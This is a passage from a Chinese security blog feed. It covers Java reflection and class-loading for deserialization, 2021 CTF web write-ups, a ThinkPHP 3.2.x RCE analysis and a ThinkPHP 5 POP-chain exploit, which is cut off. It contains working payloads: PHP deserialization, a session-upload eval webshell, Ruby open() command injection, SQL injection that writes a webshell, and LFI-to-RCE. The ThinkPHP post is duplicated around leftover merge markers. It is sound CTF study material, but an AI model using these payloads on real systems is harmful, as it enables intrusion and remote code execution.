通过ClassLoader获取\n1 2 ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader(); Class\u0026lt;?\u0026gt; c = systemClassLoader.loadClass(\u0026#34;Person\u0026#34;); 创造实例对象 通过Class的newInstance()方法 通过Constructor的newInstance()方法 1 2 3 4 5 6 7 8 9 //方式一 Class class1 = Class.forName(\u0026#34;reflection.Student\u0026#34;); Student student = (Student) class1.newInstance(); System.out.println(student); //方式二 Constructor constructor = class1.getConstructor(); Student student1 = (Student) constructor.newInstance(); System.out.println(student1); 方法一只能调用无参构造函数，一般不用\n获取类的成员变量 1 2 3 4 getField() getDeclaredField() getFields() getDeclaredFields() 修改成员变量 1 Field.set(Object obj,Object value) 如何修改私有变量？\n1 Field.setAccessible(true); 获取类的方法 1 2 3 4 getMethod(String name, Class\u0026lt;?\u0026gt;... parameterTypes) getMethods() getDeclaredMethod() getDeclaredMethods() 调用类的方法 1 invoke(Object obj, Object... args) setAccessible同理\n回到URLDNS put之前修改hashCode属性不为-1；put之后，反序列化之前修改hashCode属性为-1\n1 2 3 4 5 6 7 8 9 HashMap\u0026lt;URL,Integer\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); URL url = new URL(\u0026#34;http://y21jgo6y2e6rmwv062dgrkf2ctik69.burpcollaborator.net\u0026#34;); Class c = url.getClass(); Field hashCodeField = c.getDeclaredField(\u0026#34;hashCode\u0026#34;); hashCodeField.setAccessible(true); hashCodeField.set(url,123); hashMap.put(url,1); hashCodeField.set(url,-1); serialize(hashMap); 应用 定制需要的对象 通过invoke调用除了同名函数之外的函数 通过Class类创建对象，引入不能序列化的类 类的动态加载 类的加载机制 Java虚拟机把描述类的数据从Class文件加载到内存，并对数据进行校验、转换解析和初始化，最终形成可以被虚拟机直接使用的Java类型，这个过程被称作虚拟机的类加载机制。\n类的生命周期 类从被加载到虚拟机内存中开始，到卸载出内存为止，它的整个生命周期包括：加载，验证，准备，解析，初始化,使用,卸载这7个阶段.其中其中验证、准备、解析3个部分统称为连接\n加载：查找并加载类的二进制数据 验证：确保被加载的类的正确性 准备：为类的静态变量分配内存，并将其初始化为默认值 解析：把类中的符号引用转换为直接引用 初始化：对类的静态变量，静态代码块执行初始化操作 使用：类访问方法区内的数据结构的接口， 对象是Heap区的数据。 卸载 类加载器 虚拟机设计团队把类加载阶段中的“通过一个类的全限定名来获取描述此类的二进制字节流”这个动作放到Java虚拟机外部去实现，以便让应用程序自己决定如何去获取所需要的类。 实现这个动作的代码模块称为“类加载器”。\n类加载的三种方式 命令行启动应用时候由JVM初始化加载 通过Class.forName()方法动态加载 通过ClassLoader.loadClass()方法动态加载 .class和getClass()使用之前类均已加载完毕\n类加载机制 类的双亲委派机制\n双亲委派模型的工作过程是：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的类加载器都是如此，因此所有的加载请求最终都应该传送到最顶层的启动类加载器中，只有当父加载器反馈自己无法完成这个加载请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去完成加载。\n启动类加载器(Bootstrap ClassLoader) 这个类将器负责将存放在＜JAVA_HOME＞\\lib目录中的，或者被-Xbootclasspath参数所指定的路径中的，并且是虚拟机识别的（按照文件名识别，如rt.jar、tools.jar，名字不符合的类库即使放在lib目录中也不会被加载）类库加载到虚拟机内存中。\n扩展类加载器(Extension ClassLoader) 这个加载器由sun.misc.Launcher$ExtClassLoader实现，它负责加载＜JAVA_HOME＞\\lib\\ext目录中的，或者被java.ext.dirs系统变量所指定的路径中的所有类库，开发者可以直接使用扩展类加载器。\n应用程序类加载器(Application ClassLoader) 这个类加载器由sun.misc.Launcher$AppClassLoader来实现。由于应用程序类加载器是ClassLoader类中的getSystem-ClassLoader()方法的返回值，所以有些场合中也称它为“系统类加载器”。\n它负责加载用户类路径（ClassPath）上所有的类库，开发者同样可以直接在代码中使用这个类加载器。如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。\n我们的应用程序都是由这3种类加载器互相配合进行加载的，如果有必要，还可以加入自己定义的类加载器。\n举例如下： 当AppClassLoader加载一个class时，它首先不会自己去尝试加载这个类，而是把类加载请求委派给父类加载器ExtClassLoader去完成。 当ExtClassLoader加载一个class时，它首先也不会自己去尝试加载这个类，而是把类加载请求委派给BootStrapClassLoader去完成。 如果BootStrapClassLoader加载失败(例如在$JAVA_HOME/jre/lib里未查找到该class)，会使用ExtClassLoader来尝试加载； 若ExtClassLoader也加载失败，则会使用AppClassLoader来加载，如果AppClassLoader也加载失败，则会报出异常ClassNotFoundException。 类加载与代码执行 JVM初始化加载 初始化：静态代码块\n实例化：构造代码块、无参构造函数\n动态加载 Class.forname：初始化/不初始化皆可\nClassLoader.loadClass：不进行初始化\n加载任意类 加载自己的恶意类，拓展攻击面\n分析 1 2 继承关系： ClassLoader-\u0026gt;SecureClassLoader-\u0026gt;URLClassLoader-\u0026gt;AppClassLoader 1 2 调用链： loadClass-\u0026gt;findClass-\u0026gt;defineClass 利用 URLClassLoader任意类加载:file/http/jar\n1 2 3 4 5 // URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;file:///C:\\\\tmp\\\\\u0026#34;)}); // URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;http://localhost:8888/\u0026#34;)}); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;jar:file:///C:\\\\tmp\\\\Hello.jar!/\u0026#34;)}); Class\u0026lt;?\u0026gt; c1 = urlClassLoader.loadClass(\u0026#34;Hello\u0026#34;); c1.newInstance(); ClassLoader.defineClass 字节码加载任意类\n1 2 3 4 Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\u0026#34;C:\\\\tmp\\\\Hello.class\u0026#34;)); defineClassMethod.invoke(systemClassLoader,\u0026#34;Hello\u0026#34;,code,0,code.length); maven踩坑 中文官网下载jdk的链接有问题，需要去英文官网才正常 只有使用idea自带的maven才可以download source，否则会报错：Sources not found for: commons-collections:commons-collections:3.2.1 参考 白日梦组长的个人空间_哔哩哔哩_bilibili\n(2条消息) java序列化与反序列化全讲解_mocas_wang的博客-CSDN博客_java序列化讲解\n谈谈Java反射：从入门到实践，再到原理 - 掘金 (juejin.cn)\n关于JVM类加载机制，看这一篇就够了 - 掘金 (juejin.cn)\n","date":"2021-12-12T15:53:17+08:00","permalink":"https://k1te.cn/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/","title":"Java反序列化基础"},{"content":"躺了\nWebFTP 根据指纹找到了github上的源码：wifeat/WebFTP\n默认的密码admin888无法登录，账户信息存在Data/User/md5(username).php中，从代码逻辑上看不出什么漏洞\n发现Readme目录下有一个php探针，刚开始进去四处点 点不出东西，然后看了下源码发现提交act参数即可拿到phpinfo，然后flag在phpinfo里边\npayload：/Readme/mytz.php?act=phpinfo\npklovecloud (不是很懂题目“pklovecloud”是啥意思。。。\n直接给源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; class pkshow { function echo_name() { return \u0026#34;Pk very safe^.^\u0026#34;; } } class acp { protected $cinder; public $neutron; public $nova; function __construct() { $this-\u0026gt;cinder = new pkshow; } function __toString() { if (isset($this-\u0026gt;cinder)) return $this-\u0026gt;cinder-\u0026gt;echo_name(); } } class ace { public $filename; public $openstack; public $docker; function echo_name() { $this-\u0026gt;openstack = unserialize($this-\u0026gt;docker); $this-\u0026gt;openstack-\u0026gt;neutron = $heat; if($this-\u0026gt;openstack-\u0026gt;neutron === $this-\u0026gt;openstack-\u0026gt;nova) { $file = \u0026#34;./{$this-\u0026gt;filename}\u0026#34;; if (file_get_contents($file)) { return file_get_contents($file); } else { return \u0026#34;keystone lost~\u0026#34;; } } } } if (isset($_GET[\u0026#39;pks\u0026#39;])) { $logData = unserialize($_GET[\u0026#39;pks\u0026#39;]); echo $logData; } else { highlight_file(__file__); } ?\u0026gt; 这里主要是有个未知的$heat变量，但是没有使用global关键字的话是取不到开头include到本文件中的变量，所以应该是null，我们直接置空即可\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; class acp { protected $cinder; public $neutron ; public $nova ; function __construct($cinder) { $this-\u0026gt;cinder = $cinder; } } class ace { public $filename = \u0026#34;flag.php\u0026#34;; public $openstack; public $docker; function __construct($docker) { $this-\u0026gt;docker = $docker; } } $cp = new acp(\u0026#34;123\u0026#34;); $ce = new ace(serialize($cp)); echo urlencode(serialize(new acp($ce))); ?\u0026gt; payload:O%3A3%3A\u0026quot;acp\u0026quot;%3A3%3A%7Bs%3A9%3A\u0026quot;%00%2A%00cinder\u0026quot;%3BO%3A3%3A\u0026quot;ace\u0026quot;%3A3%3A%7Bs%3A8%3A\u0026quot;filename\u0026quot;%3Bs%3A8%3A\u0026quot;flag.php\u0026quot;%3Bs%3A9%3A\u0026quot;openstack\u0026quot;%3BN%3Bs%3A6%3A\u0026quot;docker\u0026quot;%3Bs%3A69%3A\u0026quot;O%3A3%3A\u0026quot;acp\u0026quot;%3A3%3A%7Bs%3A9%3A\u0026quot;%00%2A%00cinder\u0026quot;%3Bs%3A3%3A\u0026quot;123\u0026quot;%3Bs%3A7%3A\u0026quot;neutron\u0026quot;%3BN%3Bs%3A4%3A\u0026quot;nova\u0026quot;%3BN%3B%7D\u0026quot;%3B%7Ds%3A7%3A\u0026quot;neutron\u0026quot;%3BN%3Bs%3A4%3A\u0026quot;nova\u0026quot;%3BN%3B%7D\nEasyCleanup 题目好像下午的时候被搅屎了，还导致比赛被迫暂停（xs\n直接给源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 \u0026lt;?php if(!isset($_GET[\u0026#39;mode\u0026#39;])){ highlight_file(__file__); }else if($_GET[\u0026#39;mode\u0026#39;] == \u0026#34;eval\u0026#34;){ $shell = $_GET[\u0026#39;shell\u0026#39;] ?? \u0026#39;phpinfo();\u0026#39;; if(strlen($shell) \u0026gt; 15 | filter($shell) | checkNums($shell)) exit(\u0026#34;hacker\u0026#34;); eval($shell); } if(isset($_GET[\u0026#39;file\u0026#39;])){ if(strlen($_GET[\u0026#39;file\u0026#39;]) \u0026gt; 15 | filter($_GET[\u0026#39;file\u0026#39;])) exit(\u0026#34;hacker\u0026#34;); include $_GET[\u0026#39;file\u0026#39;]; } function filter($var): bool{ $banned = [\u0026#34;while\u0026#34;, \u0026#34;for\u0026#34;, \u0026#34;\\$_\u0026#34;, \u0026#34;include\u0026#34;, \u0026#34;env\u0026#34;, \u0026#34;require\u0026#34;, \u0026#34;?\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;^\u0026#34;, \u0026#34;+\u0026#34;, \u0026#34;-\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;`\u0026#34;]; foreach($banned as $ban){ if(strstr($var, $ban)) return True; } return False; } function checkNums($var): bool{ $alphanum = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;; $cnt = 0; for($i = 0; $i \u0026lt; strlen($alphanum); $i++){ for($j = 0; $j \u0026lt; strlen($var); $j++){ if($var[$j] == $alphanum[$i]){ $cnt += 1; if($cnt \u0026gt; 8) return True; } } } return False; } ?\u0026gt; 查看phpinfo发现session.upload_progress.cleanup参数是Off且session.save_path参数为空，参考：session.upload_progress+LFI实现RCE - ca01h\u0026rsquo;s Blog，还不需要条件竞争。\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 POST / HTTP/1.1 Host: 114.115.134.72:32770 Content-Length: 3144 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjyLGZ6hpSLAUXQv6 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=Kk Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Connection: close ------WebKitFormBoundaryjyLGZ6hpSLAUXQv6 Content-Disposition: form-data; name=\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34; \u0026lt;?php @eval($_POST[k1te]);?\u0026gt; ------WebKitFormBoundaryjyLGZ6hpSLAUXQv6 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;untitled.php\u0026#34; Content-Type: application/octet-stream \u0026lt;?php class ------WebKitFormBoundaryjyLGZ6hpSLAUXQv6-- 然后直接访问/?file=/tmp/sess_Kk即可\nPNG图片转换器 附件给了app.rb：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 require \u0026#39;sinatra\u0026#39; require \u0026#39;digest\u0026#39; require \u0026#39;base64\u0026#39; get \u0026#39;/\u0026#39; do open(\u0026#34;./view/index.html\u0026#34;, \u0026#39;r\u0026#39;).read() end get \u0026#39;/upload\u0026#39; do open(\u0026#34;./view/upload.html\u0026#34;, \u0026#39;r\u0026#39;).read() end post \u0026#39;/upload\u0026#39; do unless params[:file] \u0026amp;\u0026amp; params[:file][:tempfile] \u0026amp;\u0026amp; params[:file][:filename] \u0026amp;\u0026amp; params[:file][:filename].split(\u0026#39;.\u0026#39;)[-1] == \u0026#39;png\u0026#39; return \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;error\u0026#39;);location.href=\u0026#39;/upload\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34; end begin filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + \u0026#39;.png\u0026#39; open(filename, \u0026#39;wb\u0026#39;) { |f| f.write open(params[:file][:tempfile],\u0026#39;r\u0026#39;).read() } \u0026#34;Upload success, file stored at #{filename}\u0026#34; rescue \u0026#39;something wrong\u0026#39; end end get \u0026#39;/convert\u0026#39; do open(\u0026#34;./view/convert.html\u0026#34;, \u0026#39;r\u0026#39;).read() end post \u0026#39;/convert\u0026#39; do begin unless params[\u0026#39;file\u0026#39;] return \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;error\u0026#39;);location.href=\u0026#39;/convert\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34; end file = params[\u0026#39;file\u0026#39;] unless file.index(\u0026#39;..\u0026#39;) == nil \u0026amp;\u0026amp; file.index(\u0026#39;/\u0026#39;) == nil \u0026amp;\u0026amp; file =~ /^(.+)\\.png$/ return \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;dont hack me\u0026#39;);\u0026lt;/script\u0026gt;\u0026#34; end res = open(file, \u0026#39;r\u0026#39;).read() headers \u0026#39;Content-Type\u0026#39; =\u0026gt; \u0026#34;text/html; charset=utf-8\u0026#34; \u0026#34;var img = document.createElement(\\\u0026#34;img\\\u0026#34;);\\nimg.src= \\\u0026#34;data:image/png;base64,\u0026#34; + Base64.encode64(res).gsub(/\\s*/, \u0026#39;\u0026#39;) + \u0026#34;\\\u0026#34;;\\n\u0026#34; rescue \u0026#39;something wrong\u0026#39; end end 参考：Ruby的 open 函数导致命令执行 | Yukang\u0026rsquo;s Page，有ping命令注入内味儿了，因为过滤了..和/，所以可以用编码绕过\npayload：\n1 2 3 4 //ls / file=|echo bHMgLw==|base64 -d|bash||1.png //cat /FLA9_wmXLXmOWKLLQkpP0ceIy file=|echo Y2F0IC9GTEE5X3dtWExYbU9XS0xMUWtwUDBjZUl5|base64 -d|bash||1.png yet_another_mysql_injection 根据hint拿到源码/?source：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php include_once(\u0026#34;lib.php\u0026#34;); function alertMes($mes,$url){ die(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;{$mes}\u0026#39;);location.href=\u0026#39;{$url}\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;); } function checkSql($s) { if(preg_match(\u0026#34;/regexp|between|in|flag|=|\u0026gt;|\u0026lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|\u0026amp;|;|\\\\\\$|0x|sleep|\\ /i\u0026#34;,$s)){ alertMes(\u0026#39;hacker\u0026#39;, \u0026#39;index.php\u0026#39;); } } if (isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;username\u0026#39;] != \u0026#39;\u0026#39; \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;password\u0026#39;] != \u0026#39;\u0026#39;) { $username=$_POST[\u0026#39;username\u0026#39;]; $password=$_POST[\u0026#39;password\u0026#39;]; if ($username !== \u0026#39;admin\u0026#39;) { alertMes(\u0026#39;only admin can login\u0026#39;, \u0026#39;index.php\u0026#39;); } checkSql($password); $sql=\u0026#34;SELECT password FROM users WHERE username=\u0026#39;admin\u0026#39; and password=\u0026#39;$password\u0026#39;;\u0026#34;; $user_result=mysqli_query($con,$sql); $row = mysqli_fetch_array($user_result); if (!$row) { alertMes(\u0026#34;something wrong\u0026#34;,\u0026#39;index.php\u0026#39;); } if ($row[\u0026#39;password\u0026#39;] === $password) { die($FLAG); } else { alertMes(\u0026#34;wrong password\u0026#34;,\u0026#39;index.php\u0026#39;); } } if(isset($_GET[\u0026#39;source\u0026#39;])){ show_source(__FILE__); die; } ?\u0026gt; 最后注出来发现库里面没东西，需要利用trick使得输入和输出相等，这里直接拿队友的exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 def quine(data, debug=True): if debug: print(data) data = data.replace(\u0026#39;YY\u0026#39;,\u0026#34;REPLACE(REPLACE(YY,CHAR(34),CHAR(39)),CHAR(89),YY)\u0026#34;) blob = data.replace(\u0026#39;YY\u0026#39;,\u0026#39;\u0026#34;Y\u0026#34;\u0026#39;).replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\u0026#34;\u0026#39;) data = data.replace(\u0026#39;YY\u0026#39;,\u0026#34;\u0026#39;\u0026#34;+blob+\u0026#34;\u0026#39;\u0026#34;) if debug: print(data) return data data = quine(\u0026#34;\u0026#39;UNION/**/SELECT/**/YY/**/AS/**/ZZ#\u0026#34;) print(data) #改了下脚本 #https://www.shysecurity.com/post/20140705-SQLi-Quine #看上面这篇文章 payload:'UNION/**/SELECT/**/REPLACE(REPLACE('\u0026quot;UNION/**/SELECT/**/REPLACE(REPLACE(\u0026quot;Y\u0026quot;,CHAR(34),CHAR(39)),CHAR(89),\u0026quot;Y\u0026quot;)/**/AS/**/ZZ#',CHAR(34),CHAR(39)),CHAR(89),'\u0026quot;UNION/**/SELECT/**/REPLACE(REPLACE(\u0026quot;Y\u0026quot;,CHAR(34),CHAR(39)),CHAR(89),\u0026quot;Y\u0026quot;)/**/AS/**/ZZ#')/**/AS/**/ZZ#\n","date":"2021-09-16T19:47:24+08:00","permalink":"https://k1te.cn/p/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8Aweb/","title":"2021第五空间线上web"},{"content":"前段时间打比赛的时候遇到了Think PHP3.2.x RCE的题目，这个洞是上个月爆出来的：【漏洞通报】ThinkPHP3.2.x RCE漏洞通报。虽然3已经不是主流版本了，但是考虑到还是有不少老的站在用，所以还是有一定的价值的，这里分析一下。\n利用 这里用的是Think PHP3.2.5完整版，具体每个版本之间的区别可以看看参考链接\n利用的条件是assign方法的第一个变量可控。因此我们可以在indexController写入demo：\n1 2 3 4 public function index($value=\u0026#39;\u0026#39;){ $this-\u0026gt;assign($value); $this-\u0026gt;display(); } payload：?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=.\\Application\\Runtime\\Logs\\Home\\21_06_30.log\n本质上是一个文件包含，再结合报错写log最终达到rce的目的\n分析 这里我们先不包含log，而是包含config.ini来分析文件包含，payload：\n1 ?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=C://config.ini 首先我们的可控参数通过Controller.class.php中的assign函数最终跳到了View.class.php中的assign函数： 在该函数中将其赋值给$this-\u0026gt;tVar变量：\n赋值结束后回到IndexController再进入到display函数，和上面的assign函数一样最终跳到View.class.php的display函数中，该函数中的fetch函数解析并获取模板文件内容，此时模板文件路径和内容为空：\n继续跟进fetch函数，该函数中将空的templateFile传入parseTemplate函数:\n当参数为空时，parseTemplate函数返回默认的模板文件位置./Application/Home/View/Index/index.html\n接着往下走，系统配置的默认模板引擎为think，所以程序进入else分支\n将this-\u0026gt;tVar放入params变量中跳入Hook::listen，tag变量是写死的view_parse，因此name变量为Behavior\\ParseTemplateBehavior，接着进入self::exec\n在exec函数中调用Behavior\\ParseTemplateBehavior的run方法处理带有我们可控参数的$params变量：\n在run方法中经过一些判断，最终调用fetch函数编译并加载模板文件，此时第二个参数就是我们的可控参数：array(\u0026quot;_filename\u0026quot;=\u0026gt;\u0026ldquo;C://config.ini\u0026rdquo;);\n继续跟进fetch，获取缓存文件路径后，进入Storage的load方法中：\n在load方法中，$_filename为之前获取的缓存文件路径，$var则为之前带有_filename=C://config.ini的数组，利用extract方法进行变量覆盖，实现任意文件包含：\n众所周知，include函数不在意包含的什么文件：\n因此我们可以构造一个不存在的模块，使得tp报错，此时tp会将url写入log中，所以我们可以在url中写入恶意代码，再结合上面的LFI实现任意代码执行。\n======= title: \u0026ldquo;TP3.2.xRCE\u0026rdquo; date: 2021-08-14T16:19:19+08:00 categories:\n漏洞复现 tags: TP web 前段时间打比赛的时候遇到了Think PHP3.2.x RCE的题目，这个洞是上个月爆出来的：【漏洞通报】ThinkPHP3.2.x RCE漏洞通报。虽然3已经不是主流版本了，但是考虑到还是有不少老的站在用，所以还是有一定的价值的，这里分析一下。\n利用 这里用的是Think PHP3.2.5完整版，具体每个版本之间的区别可以看看参考链接\n利用的条件是assign方法的第一个变量可控。因此我们可以在indexController写入demo：\n1 2 3 4 public function index($value=\u0026#39;\u0026#39;){ $this-\u0026gt;assign($value); $this-\u0026gt;display(); } payload：?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=.\\Application\\Runtime\\Logs\\Home\\21_06_30.log\n本质上是一个文件包含，再结合报错写log最终达到rce的目的\n分析 这里我们先不包含log，而是包含config.ini来分析文件包含，payload：\n1 ?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=C://config.ini 首先我们的可控参数通过Controller.class.php中的assign函数最终跳到了View.class.php中的assign函数： 在该函数中将其赋值给$this-\u0026gt;tVar变量：\n赋值结束后回到IndexController再进入到display函数，和上面的assign函数一样最终跳到View.class.php的display函数中，该函数中的fetch函数解析并获取模板文件内容，此时模板文件路径和内容为空：\n继续跟进fetch函数，该函数中将空的templateFile传入parseTemplate函数:\n当参数为空时，parseTemplate函数返回默认的模板文件位置./Application/Home/View/Index/index.html\n接着往下走，系统配置的默认模板引擎为think，所以程序进入else分支\n将this-\u0026gt;tVar放入params变量中跳入Hook::listen，tag变量是写死的view_parse，因此name变量为Behavior\\ParseTemplateBehavior，接着进入self::exec\n在exec函数中调用Behavior\\ParseTemplateBehavior的run方法处理带有我们可控参数的$params变量：\n在run方法中经过一些判断，最终调用fetch函数编译并加载模板文件，此时第二个参数就是我们的可控参数：array(\u0026quot;_filename\u0026quot;=\u0026gt;\u0026ldquo;C://config.ini\u0026rdquo;);\n继续跟进fetch，获取缓存文件路径后，进入Storage的load方法中：\n在load方法中，$_filename为之前获取的缓存文件路径，$var则为之前带有_filename=C://config.ini的数组，利用extract方法进行变量覆盖，实现任意文件包含：\n众所周知，include函数不在意包含的什么文件：\n因此我们可以构造一个不存在的模块，使得tp报错，此时tp会将url写入log中，所以我们可以在url中写入恶意代码，再结合上面的LFI实现任意代码执行。\nef5418316bb4efc68bd96772d45afc77caf7808c\n","date":"2021-08-14T16:19:19+08:00","permalink":"https://k1te.cn/p/tp3.2.xrce/","title":"TP3.2.xRCE"},{"content":"emm，怎么说呢，可能是为了配合夏令营吧，大部分都是框架题，网上搜一下就差不多能找到了，但是实话实说，题目质量确实一般\nWeb ezrce 参考：Yapi远程命令执行漏洞复现 - FreeBuf网络安全行业门户，直接打就行\ncat flag 直接给源码：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php if (isset($_GET[\u0026#39;cmd\u0026#39;])) { $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!preg_match(\u0026#39;/flag/i\u0026#39;,$cmd)) { $cmd = escapeshellarg($cmd); system(\u0026#39;cat \u0026#39; . $cmd); } } else { highlight_file(__FILE__); } ?\u0026gt; cmd参数不能包含flag关键词，然后经过escapeshellarg函数之后执行cat命令。\n有个hint：管理员曾访问过flag。\n经过一番查找，找到了nignx的access.log，payload:/?cmd=/var/log/nginx/access.log，可以看到有一个/this_is_final_flag_e2a457126032b42d.php，应该就是要cat这个文件了，但是文件名里包含了flag关键词，而且又经过了escapeshellarg函数，没法命令注入\n找了蛮久的，最后在文档里找到这么一个评论\n意思大概是escapeshellarg会在没有设置lang环境变量的时候将非ASCII字符丢弃，所以我们可以使用非ASCII字符绕过，最终payload：/?cmd=this_is_final_fl%ffag_e2a457126032b42d.php\n其实早上的时候就看到了相关的文章：\n但是当时尝试的是ā这个字符，不知道为啥不行\neasythinkphp 一个thinkphp3.2.3比较新的洞，参考：【漏洞通报】ThinkPHP3.2.x RCE漏洞通报 (qq.com)\n最终payload：/?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=../../../flag\njspxcms 参考：复现jspxcms解压getshell漏洞 | lockcy\u0026rsquo;s cave\n需要管理员的权限，比赛的时候是公用靶机，每十分钟重置一次，刚开始的时候进不了后台找不到点，后面就盯着重置然后冲进去改密码hh\n需要用到冰蝎，冰蝎的坑具体参考：为啥子java14还是运行不了 · Issue #115 · rebeyond/Behinder (github.com)\n最后：\ncybercms www.zip有源码\n根据源码的信息确定是BEESCMS，网上寻找相关漏洞利用，大概找到这么几篇吧：\n【代码审计初探】beescms v4.0_R SQL_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)\n【代码审计】对Beescms SQL注入漏洞的进一步思考_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)\n【送0day】代码审计就该这么来3 beescms getshell_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)\nsession覆盖可以进入后台，但是上传的时候显示permission deny，于是转向sql注入。\n与源码对比发现出题人增加了一个过滤函数，并且把报错关了（没找到报错在哪关了。。）：\n可以看到这个过滤还是很好绕的，上面的用双写绕过，下面的用/**/绕过即可\n实际测试发现经过htmlspecialchars的字符可以注入到sql语句，但是没法正常放进数据库里（tcl，不知道为啥）\n最终payload：user=admin%27/**/un+union+ion/**/selselectect/**/null,null,null,null,0x3c3f70687020686967686c696768745f66696c65285f5f46494c455f5f293b406576616c28245f504f53545b6b3174655d293b3f3e/**/into/**/outoutfilefile/**/%27/var/www/html/shell.php%27%23\n效果：\nez_website 参考：齐博建站系统x1.0代码审计 - Ma4ter Blog\nlabelmodels控制器get_label方法直接将tag_arrar数组键cfg的值进行了反序列化：\n直接拿tp5的pop链打就行，网上找了个exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 \u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Model的子类new Pivot(); Model是抽象类 } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output; $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //调用getError 返回this-\u0026gt;error $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error 要为 